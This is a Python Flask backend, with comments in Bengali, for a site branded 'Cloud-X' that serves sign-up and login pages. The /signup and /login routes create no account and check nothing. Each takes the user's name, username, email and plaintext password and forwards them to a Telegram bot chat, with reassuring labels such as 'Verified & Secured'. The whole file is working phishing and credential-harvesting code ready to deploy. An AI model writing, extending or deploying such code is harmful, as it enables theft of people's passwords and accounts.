import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও চ্যাট আইডি রিড করবে
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

@app.route('/')
def index():
    return render_template('index.html')

# লগইন পেজ দেখানোর জন্য নতুন রাউট
@app.route('/login-page')
def login_page():
    return render_template('login.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (সাইনআপ)
    telegram_message = (
        f"🚨 *New Cloud-X Registration* 🚨\n\n"
        f"👤 *Full Name:* {full_name}\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Verified & Secured"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": telegram_message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Data sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# লগইন ডেটা প্রসেস ও টেলিগ্রামে পাঠানোর রাউট
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (লগইন)
    telegram_message = (
        f"🔐 *Cloud-X User Login Attempt* 🔐\n\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Login Verified"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": telegram_message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Login details sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
